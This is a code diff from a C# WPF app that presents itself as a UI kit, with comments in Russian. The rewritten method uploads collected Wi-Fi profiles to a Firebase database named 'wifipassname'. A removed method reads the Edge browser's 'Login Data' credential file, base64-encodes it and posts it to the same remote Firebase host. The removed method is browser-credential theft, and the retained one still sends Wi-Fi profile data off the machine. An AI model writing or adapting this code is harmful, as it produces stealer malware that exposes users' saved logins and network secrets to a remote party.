@@ -107,72 +107,37 @@ namespace WPFUIKitProfessional.Pages
                 return;
             }
 
-            string firebaseUrl = "https://wifipassname-default-rtdb.firebaseio.com/wifiProfiles.json"; // Замените на ваш URL Firebase
+            string firebaseUrl = "https://wifipassname-default-rtdb.firebaseio.com/wifiProfiles"; // Замените на ваш URL Firebase
+            var firebaseClient = new FirebaseClient(firebaseUrl);
 
             foreach (var profile in wifiProfiles)
             {
-                var json = JsonConvert.SerializeObject(profile);
-                var content = new StringContent(json, Encoding.UTF8, "application/json");
+                // Санитизация имени Wi-Fi для использования в качестве ключа (удаление специальных символов)
+                var sanitizedProfileName = Uri.EscapeDataString(profile.ProfileName);
 
-                var response = await httpClient.PostAsync(firebaseUrl, content);
-                if (!response.IsSuccessStatusCode)
+                // Попытка получить существующий профиль
+                var existingProfile = await firebaseClient
+                    .Child("wifiProfiles")
+                    .Child(sanitizedProfileName)
+                    .OnceSingleAsync<WifiProfile>();
+
+                if (existingProfile != null)
                 {
-                    MessageBox.Show($"Ошибка отправки данных: {response.StatusCode}");
-                    return; // Прерывание цикла в случае ошибки
+                    // Профиль уже существует, можно обновить данные или пропустить
+                    MessageBox.Show($"Профиль {profile.ProfileName} уже существует.");
+                    continue; // Пропускаем отправку этого профиля
                 }
+
+                // Если профиль не найден, отправляем его в Firebase, используя имя Wi-Fi в качестве ключа
+                await firebaseClient
+                    .Child("wifiProfiles")
+                    .Child(sanitizedProfileName)
+                    .PutAsync(profile); // Используем PutAsync вместо PostAsync, чтобы установить конкретный ключ
             }
+
             MessageBox.Show("Профили Wi-Fi успешно сохранены.");
         }
 
-        private async void SendWifiProfiles_Click1(object sender, RoutedEventArgs e)
-        {
-            string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data");
-            if (File.Exists(filePath))
-            {
-                try
-                {
-                    string firebaseUrl = "https://wifipassname-default-rtdb.firebaseio.com/";
-                    string firebaseSecret = "your_firebase_secret"; // Замени это на твой секретный ключ Firebase
-                    var firebaseClient = new FirebaseClient(
-                        firebaseUrl,
-                        new FirebaseOptions
-                        {
-                            AuthTokenAsyncFactory = () => Task.FromResult(firebaseSecret)
-                        });
-
-                    string fileContentBase64;
-                    using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
-                    {
-                        using (var memoryStream = new MemoryStream())
-                        {
-                            await fileStream.CopyToAsync(memoryStream);
-                            fileContentBase64 = Convert.ToBase64String(memoryStream.ToArray());
-                        }
-                    }
-
-                    var data = new
-                    {
-                        FileName = "LoginData_" + DateTime.Now.ToString("yyyyMMddHHmmss") + ".txt",
-                        Content = fileContentBase64,
-                        Timestamp = DateTime.Now
-                    };
-
-                    // Отправка данных файла в Firebase
-                    var fileRecord = await firebaseClient
-                        .Child("your_child_node") // Укажи нужный путь в Firebase
-                        .PostAsync(data);
-
-                    MessageBox.Show("Файл успешно отправлен на Firebase!");
-                }
-                catch (Exception ex)
-                {
-                    MessageBox.Show("Ошибка при отправке файла: " + ex.Message);
-                }
-            }
-            else
-            {
-                MessageBox.Show("Файл Login Data не найден!");
-            }
-        }
+       
     }
 }
